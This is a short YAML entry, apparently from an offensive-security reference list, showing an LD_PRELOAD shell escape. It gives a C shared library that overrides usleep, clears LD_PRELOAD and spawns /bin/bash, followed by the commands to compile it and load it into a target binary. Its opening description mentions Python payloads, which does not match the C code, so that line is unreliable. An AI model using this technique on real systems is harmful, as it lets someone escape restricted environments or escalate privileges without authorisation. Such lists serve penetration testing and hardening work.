---
description: The payloads are compatible with both Python version 2 and 3.
functions:
  shell:
    - description: Search binaries with ``echo *``, get ``objdump -T binary | grep GLIC`` and make a script to deplace one of the function:
      code: |
	vim script.c
	#include <stdio.h>
	#include <stdlib.h>
	void usleep() {
	  unsetenv("LD_PRELOAD");
	  system("echo ok! && /bin/bash");
	  exit(0);
	}
	gcc -shared script.c -o script
	declare -x LD_PRELOAD=/path/to/script
---
